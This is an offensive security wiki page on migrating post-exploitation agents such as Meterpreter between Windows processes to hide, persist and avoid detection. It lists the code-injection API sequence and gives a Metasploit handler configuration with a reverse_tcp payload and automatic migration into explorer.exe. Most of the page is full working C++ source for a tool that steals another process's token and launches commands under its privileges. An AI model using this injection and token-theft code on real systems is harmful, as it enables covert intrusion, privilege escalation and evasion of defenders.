# ⭕ Process Migration

## <mark style="color:red;">Process Migration</mark>

Sometimes, active agent process (meterpreter, empire agent, covenant grunt, etc) has to be migrated to:

* Hiding the process to gain persistence and avoid detection.
* Change the process architecture to execute some payloads with the corrent architecture. For example, if there is a 64-bits system and our meterpreter process is 86-bits, some architecture-related problems could happen if we try to execute some exploits against the session gained.
* Migrate to a more stable process.

## <mark style="color:red;">Meterpreter Migration</mark>

Migration process is as follow:

1. A metasploit handler is configured to retrieve a meterpreter sessions.
2. Processes are listed to select the desired one to migrate (`ps` command).
3. &#x20;Migrate to the desired process (`migrate <PID>`)

### <mark style="color:orange;">Migration process detailed</mark>

* **1** Get the PID the user wants to migrate into. This is the target process.
* **2** Check the architecture of the target process whether it is 32 bit or 64 bit. It is important for memory alignment.
* **3** Check if the meterpreter process has the SeDebugPrivilege. This is used to get a handle to the target process.
* **4** Get the actual payload from the handler that is going to be injected into the target process. Calculate its length as well.
* **5** Call the OpenProcess() API to gain access to the virtual memory of the target process.
* **6** Call the VirtualAllocEx() API to allocate an RWX (Read, Write, Execute) memory in the target process
* **7** Call the WriteProcessMemory() API to write the payload in the target memory virtual memory space.
* **8** Call the CreateRemoteThread() API to execute the newly created memory stub having the injected payload in a new thread.
* **9** Shutdown the previous thread having the initial meterpreter running in the old process.

### <mark style="color:orange;">Prepend Migrate</mark>

Tell metasploit to migrate to a more stable/opsec process right after getting a meterpreter shell:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
set lport 1234
set prependmigrateprocess explorer.exe
set prependmigrate true
exploit
ps | grep shell.exe
kill 8064
sysinfo
```

## <mark style="color:red;">Sample C++ Code</mark>

* Check if the **migrate.exe** process is running with the privileges of the **“nt authority\system”** user. We need it for future impersonation functionality.
* Open Handle to the wanted process (_this is the PID of the process we want to steal the privilege tokens from_).
* Duplicate their tokens (_privileges in windows system was managed by tokens_).
* If the duplication was successful it tries to run new process by using these duplicated tokens.



```cpp
#include <windows.h>
#include <wchar.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

using namespace std; 

void usage(char *name)

{
       cout << "(-) Ex.: " << name << " <PID>  :: for open cmd.exe with new privilages.\n";
       cout << "(-) Ex.: " << name << " <PID> \"<command>\" :: for execute command by priveleges of requested PID.\n";
} 

BOOL SetPrivilege(HANDLE hToken,          // access token handle
                  LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
                  BOOL bEnablePrivilege   // to enable or disable privilege )

{
       TOKEN_PRIVILEGES tp;
       LUID luid;

       if (!LookupPrivilegeValue(
              NULL,            // lookup privilege on local system
              lpszPrivilege,   // privilege to lookup
              &luid))        // receives LUID of privilege

       {
              printf("\t(-) LookupPrivilegeValue error: %u\n", GetLastError());
              return FALSE;
       }

 
       tp.PrivilegeCount = 1;
       tp.Privileges[0].Luid = luid;
       if (bEnablePrivilege)
              tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
       else
              tp.Privileges[0].Attributes = 0;

       // Enable the privilege or disable all privileges.
       if (!AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL))
       {
              printf("\t(-) AdjustTokenPrivileges error: %u\n", GetLastError());
              return FALSE;
       }

       if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) 
       {
              printf("\t(-) The token does not have the specified privilege. ");
              return FALSE;
       }

       return TRUE;
}


BOOL check()
{
       BOOL result = TRUE;
       BOOL bResult;
       HANDLE fhToken;
       LUID fLuid;
       PRIVILEGE_SET privs;
       OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &fhToken);
       wchar_t *cPrivs[] = { L"SeAssignPrimaryTokenPrivilege", L"SeTcbPrivilege" };
       for (int i = 0; i < 2; i++)
       {
              if (!LookupPrivilegeValue(
                      NULL,                               // lookup privilege on local system
                      (LPCTSTR)cPrivs[i],                // privilege to lookup
                      &fLuid))                          // receives LUID of privilege
                      {
                             printf("LookupPrivilegeValue error: %u\n", GetLastError());
                             ExitProcess(0);
                      }

              privs.PrivilegeCount = 1;
              privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
              privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
              privs.Privilege[0].Luid = fLuid;
              PrivilegeCheck(fhToken, &privs, &bResult);
              if (!bResult)
                      {
                             wprintf(L"\t(-) The process dosn't have the %s\n\n", cPrivs[i]);
                             result = FALSE;
                      }
       }
       return result;
}


int main(int argc, char *argv[])
{
       DWORD flag;
       if (argc <= 1 || argc >= 4)
       {
              usage(argv[0]);
              exit(0);
       }

       char *command;
       if (argc > 2)
       {
              command = argv[2];
              flag = CREATE_NO_WINDOW;
       }

       else
       {
              command = "cmd.exe";
              flag = 0;
       }

       DWORD pid = atoi(argv[1]);
       cout << "\n[***] Starting the migrate functionality, requested PID => " << pid << " [***]\n";
       cout << "(!) Check if the process have an required permissions...\n";
       Sleep(1000);

       if (!check())
       {
              cout << "(!) Trying to set the necessary privileges.\n";
              HANDLE currentProcessToken;
              OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
              wchar_t *privs[9] = {L"SeAssignPrimaryTokenPrivilege", L"SeTcbPrivilege", L"SeCreateGlobalPrivilege", L"SeDebugPrivilege", L"SeImpersonatePrivilege", L"SeIncreaseQuotaPrivilege", L"SeProfileSingleProcessPrivilege", L"SeSecurityPrivilege", L"SeSystemEnvironmentPrivilege"};
              for (int i = 0; i < 9; i++)
              {
                      if (!SetPrivilege(currentProcessToken, privs[i], true))
                      {
                             wprintf(L"Access denied to set %s \n", privs[i]);
                             cout << "\t(-) You does not have the specified privilege. Migration aborted.\n";
                             ExitProcess(0);
                      }
              }
       }
       cout << "\t(+) All required Permissions was successfull granted.\n\n";  
    
       cout << "(!) Trying to open Handel for requested PID.\n";
       Sleep(1000);
       HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
       if (!hProcess) {
              cout << "\t(-) Can not open handle for requested PID";
              ExitProcess(0);
       }
       cout << "\t(+) The HANDLE was created success.\n\n";

       cout << "(!) Try to Duplicte existen tokens of the requested PID " << pid << "\n";
       HANDLE NewTokens;
       if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &NewTokens))
       {
              cout << "\t(-) Denied to handle Process Tokens\n";
              ExitProcess(0);
       }
       cout << "\t(+) Extracting tokens was successfull\n";
       Sleep(500);

       HANDLE hPrimaryToken;
       if (!DuplicateTokenEx(NewTokens, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken))
       {
              cout << "\t(-) Denied to Duplicate process Tokens\n";
       }
       cout << "\t(+) Duplicate tokens was successfull\n\n";
       Sleep(1000);

       cout << "(!) Try to execute new process with duplicated tokens.\n";
       STARTUPINFO si;
       PROCESS_INFORMATION pi;
       ZeroMemory(&si, sizeof(si));
       si.cb = sizeof(si);
       si.lpDesktop = L"WinSta0\\Default"; //window station and desktop of interactive user
       ZeroMemory(&pi, sizeof(pi));
       wchar_t cmd[500];
       swprintf_s(cmd, L"cmd.exe /c %hs", command);
       Sleep(500);

       if (!CreateProcessWithTokenW(hPrimaryToken, 0x00000001, NULL, (LPWSTR)cmd, flag, NULL, NULL, &si, &pi))
       {
              cout << "\t(-) Somthing went wrong!!! \n\t";
              printf("     -Can't create new process with Extracted tokens, got error: %u\n", GetLastError());
              ExitProcess(0);

       }
       cout << "[***] We successfuly Migrated to requested PID. [***]\n";

       if (command != argv[2])
       {
              cout << "[***] The CMD console with new privilages was opened. [***]\n";
       }

       else
       {
              cout << "[***] Command was executed succesfully!!! [***]";
       }
       return 0;

}
```



